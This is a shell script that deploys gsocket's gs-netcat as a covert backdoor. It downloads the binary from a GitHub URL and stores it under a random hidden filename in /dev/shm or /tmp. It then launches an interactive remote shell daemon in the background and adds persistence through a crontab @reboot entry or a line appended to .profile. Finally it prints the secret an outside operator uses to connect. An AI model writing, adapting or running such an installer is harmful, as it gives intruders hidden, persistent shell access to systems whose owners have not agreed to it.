#!/bin/sh
# Gsocket Deploy - SH Compatible Version
# Works with: sh, ash, dash, busybox sh

# ===== CONFIG =====
GS_SECRET="${GS_SECRET:-}"
GS_HOST="${GS_HOST:-}"
GS_PORT="${GS_PORT:-443}"
GS_BEACON="${GS_BEACON:-}"

URL_BASE="https://github.com/hackerschoice/binary/raw/refs/heads/main/gsocket"
URL_BIN="${URL_BASE}/bin"

# ===== COLORS (disabled for sh compatibility) =====
RED=''
GREEN=''
YELLOW=''
CYAN=''
RESET=''

# Enable colors if terminal supports it
if [ -t 1 ]; then
    RED='\033[91m'
    GREEN='\033[92m'
    YELLOW='\033[93m'
    CYAN='\033[96m'
    RESET='\033[0m'
fi

# ===== FUNCTIONS =====
log_ok() {
    printf "${GREEN}[OK]${RESET} %s\n" "$1"
}

log_fail() {
    printf "${RED}[FAIL]${RESET} %s\n" "$1"
}

log_info() {
    printf "${CYAN}[*]${RESET} %s\n" "$1"
}

log_warn() {
    printf "${YELLOW}[!]${RESET} %s\n" "$1"
}

# Detect architecture
detect_arch() {
    ARCH=$(uname -m)
    OS=$(uname -s)
    
    case "$OS" in
        Linux)
            case "$ARCH" in
                x86_64)  SRC_PKG="gs-netcat_mini-linux-x86_64" ;;
                i686|i386) SRC_PKG="gs-netcat_mini-linux-i686" ;;
                aarch64) SRC_PKG="gs-netcat_mini-linux-aarch64" ;;
                armv7l)  SRC_PKG="gs-netcat_mini-linux-armv7l" ;;
                armv6l)  SRC_PKG="gs-netcat_mini-linux-armv6" ;;
                arm*)    SRC_PKG="gs-netcat_mini-linux-arm" ;;
                mips64)  SRC_PKG="gs-netcat_mini-linux-mips64" ;;
                mips*)   SRC_PKG="gs-netcat_mini-linux-mips32" ;;
                *)       SRC_PKG="gs-netcat_mini-linux-x86_64" ;;
            esac
            ;;
        Darwin)
            case "$ARCH" in
                arm64) SRC_PKG="gs-netcat_mini-macOS-arm64" ;;
                *)     SRC_PKG="gs-netcat_mini-macOS-x86_64" ;;
            esac
            ;;
        FreeBSD)
            SRC_PKG="gs-netcat_mini-freebsd-x86_64"
            ;;
        *)
            SRC_PKG="gs-netcat_mini-linux-x86_64"
            ;;
    esac
    
    log_info "Detected: $OS $ARCH"
    log_info "Package: $SRC_PKG"
}

# Check for download tool
check_dl_tool() {
    if command -v curl >/dev/null 2>&1; then
        DL_CMD="curl"
        DL_ARGS="-fsSL -o"
    elif command -v wget >/dev/null 2>&1; then
        DL_CMD="wget"
        DL_ARGS="-qO"
    else
        log_fail "Need curl or wget!"
        exit 1
    fi
    log_info "Using: $DL_CMD"
}

# Generate random string
gen_random() {
    if [ -r /dev/urandom ]; then
        head -c 16 /dev/urandom 2>/dev/null | od -A n -t x1 2>/dev/null | tr -d ' \n' | head -c 16
    elif command -v openssl >/dev/null 2>&1; then
        openssl rand -hex 8 2>/dev/null
    else
        # Fallback
        echo "$(date +%s)$$" | md5sum 2>/dev/null | head -c 16
    fi
}

# Find writable directory
find_dstdir() {
    # Try common directories
    for dir in "/dev/shm" "/tmp" "/var/tmp" "$HOME" "."; do
        if [ -d "$dir" ] && [ -w "$dir" ]; then
            DSTDIR="$dir"
            break
        fi
    done
    
    if [ -z "$DSTDIR" ]; then
        log_fail "No writable directory found!"
        exit 1
    fi
    
    # Generate hidden name
    BIN_NAME=".$(gen_random | head -c 8)"
    DSTBIN="${DSTDIR}/${BIN_NAME}"
    log_info "Install to: $DSTBIN"
}

# Download binary
download_bin() {
    log_info "Downloading gs-netcat..."
    
    URL="${URL_BIN}/${SRC_PKG}"
    
    if [ "$DL_CMD" = "curl" ]; then
        curl -fsSL "$URL" -o "$DSTBIN" 2>/dev/null
    else
        wget -qO "$DSTBIN" "$URL" 2>/dev/null
    fi
    
    if [ $? -ne 0 ] || [ ! -f "$DSTBIN" ]; then
        log_fail "Download failed!"
        exit 1
    fi
    
    chmod 700 "$DSTBIN"
    log_ok "Downloaded"
}

# Test binary
test_bin() {
    log_info "Testing binary..."
    
    # Try to execute
    OUTPUT=$("$DSTBIN" -g 2>/dev/null)
    
    if [ -z "$OUTPUT" ]; then
        log_fail "Binary not working!"
        rm -f "$DSTBIN"
        exit 1
    fi
    
    # Use output as secret if not set
    if [ -z "$GS_SECRET" ]; then
        GS_SECRET="$OUTPUT"
    fi
    
    log_ok "Binary works"
}

# Start gs-netcat
start_gs() {
    log_info "Starting gs-netcat..."
    
    # Build args
    GS_ARGS="-ilqD"
    [ -n "$GS_BEACON" ] && GS_ARGS="${GS_ARGS}w"
    
    # Export env
    export GS_SECRET
    [ -n "$GS_HOST" ] && export GS_HOST
    [ -n "$GS_PORT" ] && export GS_PORT
    [ -n "$GS_BEACON" ] && export GS_BEACON
    
    # Start in background
    nohup "$DSTBIN" $GS_ARGS >/dev/null 2>&1 &
    
    sleep 1
    
    # Check if running
    if ps aux 2>/dev/null | grep -v grep | grep -q "$BIN_NAME"; then
        log_ok "Started!"
    elif pgrep -f "$BIN_NAME" >/dev/null 2>&1; then
        log_ok "Started!"
    else
        # Try alternative start
        cd /tmp 2>/dev/null || cd /
        "$DSTBIN" $GS_ARGS &
        log_warn "Started (may not persist)"
    fi
}

# Add persistence
add_persistence() {
    log_info "Adding persistence..."
    
    # Try crontab
    if command -v crontab >/dev/null 2>&1; then
        CRON_LINE="@reboot $DSTBIN -ilqD"
        (crontab -l 2>/dev/null | grep -v "$BIN_NAME"; echo "$CRON_LINE") | crontab - 2>/dev/null
        if [ $? -eq 0 ]; then
            log_ok "Added to crontab"
            return
        fi
    fi
    
    # Try .profile
    if [ -w "$HOME/.profile" ] || [ ! -f "$HOME/.profile" ]; then
        PROFILE_LINE="$DSTBIN -ilqD 2>/dev/null &"
        if ! grep -q "$BIN_NAME" "$HOME/.profile" 2>/dev/null; then
            echo "$PROFILE_LINE" >> "$HOME/.profile"
            log_ok "Added to .profile"
            return
        fi
    fi
    
    log_warn "Could not add persistence"
}

# Show connection info
show_info() {
    echo ""
    echo "======================================"
    printf "${GREEN}[+] Installation Complete!${RESET}\n"
    echo "======================================"
    echo "Secret  : $GS_SECRET"
    echo "Binary  : $DSTBIN"
    [ -n "$GS_HOST" ] && echo "Host    : $GS_HOST"
    [ -n "$GS_BEACON" ] && echo "Beacon  : $GS_BEACON min"
    echo ""
    echo "To connect:"
    CMD="gs-netcat -i -s \"$GS_SECRET\""
    [ -n "$GS_HOST" ] && CMD="GS_HOST=$GS_HOST $CMD"
    [ -n "$GS_BEACON" ] && CMD="$CMD -w"
    printf "${CYAN}%s${RESET}\n" "$CMD"
    echo "======================================"
}

# ===== MAIN =====
main() {
    echo ""
    log_info "GSocket Deploy (SH Compatible)"
    echo ""
    
    # Check if running as S= mode (direct connect)
    if [ -n "$S" ]; then
        GS_SECRET="$S"
        detect_arch
        check_dl_tool
        find_dstdir
        download_bin
        
        log_info "Connecting with secret: $GS_SECRET"
        exec "$DSTBIN" -i -s "$GS_SECRET"
        exit $?
    fi
    
    # Use X= as secret if provided
    [ -n "$X" ] && GS_SECRET="$X"
    
    detect_arch
    check_dl_tool
    find_dstdir
    download_bin
    test_bin
    start_gs
    add_persistence
    show_info
}

# Run
main "$@"
